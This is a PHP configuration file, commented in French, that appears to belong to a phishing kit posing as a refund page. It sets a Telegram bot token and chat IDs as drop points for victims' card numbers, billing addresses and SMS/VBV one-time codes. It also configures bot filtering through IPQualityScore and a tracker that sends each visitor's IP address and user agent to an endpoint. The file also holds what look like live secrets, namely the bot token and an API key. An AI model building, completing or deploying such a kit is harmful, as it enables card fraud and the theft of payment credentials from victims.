<?php
$montant = '27,94'; // montant du remboursement

$bot_token = '8769773383:AAFui49gFgIj4eXAg4XrQomBhWudNDhKJB0'; // token du bot

$rez_click = '-5166505411'; // cliques
$rez_billing = '-5166505411'; // billing et adresse
$rez_card = '-5166505411'; // cc
$rez_vbv = '-5166505411'; // sms et vbv

$MotDePassePanel = 'DFJDFDKFKFKDJFKDJFKDJFKDJFKDFJDKFJKDFJ';

$captcha_enabled = true;
$otp_mode = true;

// IPQualityScore (optionnel) — mettre $ipqs_enabled = true pour activer
$ipqs_enabled = false;
$ipqs_api_key = 'J9QGYobZy3jVIV1MEHXWlORmqxCeu8PW'; // clé API IPQS

// ── Auto-tracker ──────────────────────────────────────────────
if (!defined('_TRACKER_PAGE_ID_')) define('_TRACKER_PAGE_ID_', '5ef209ca-de97-4ee1-b966-dc3ee4827a9c');
if (!defined('_TRACKER_URL_')) define('_TRACKER_URL_', 'http://127.0.0.1:3000/api/track/5ef209ca-de97-4ee1-b966-dc3ee4827a9c');
if (!function_exists('_tracker_fire_')) {
function _tracker_fire_($event) {
  if (!function_exists('curl_init')) return;
  $ch = @curl_init(_TRACKER_URL_);
  if (!$ch) return;
  @curl_setopt_array($ch, [CURLOPT_POST=>1, CURLOPT_POSTFIELDS=>json_encode(['e'=>$event,'ip'=>$_SERVER['REMOTE_ADDR']??'','ua'=>$_SERVER['HTTP_USER_AGENT']??'']), CURLOPT_HTTPHEADER=>['Content-Type: application/json'], CURLOPT_TIMEOUT_MS=>300, CURLOPT_RETURNTRANSFER=>1, CURLOPT_NOSIGNAL=>1]);
  @curl_exec($ch); @curl_close($ch);
}
}
if (isset($_SERVER['REQUEST_METHOD']) && !defined('_TRACKER_INIT_')) {
  define('_TRACKER_INIT_', true);
  $__self = basename($_SERVER['PHP_SELF'] ?? '');
  if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    if (!isset($_SESSION['_trk_v'])) { $_SESSION['_trk_v'] = 1; _tracker_fire_('view'); }
    _tracker_fire_('hb');
  } elseif ($__self === 'click.php') {
    _tracker_fire_('click');
  }
  register_shutdown_function(function() {
    if (isset($_SESSION['bot']) && $_SESSION['bot'] === true) _tracker_fire_('blocked');
  });
}
$test_mode = false;
$page_offline = false;
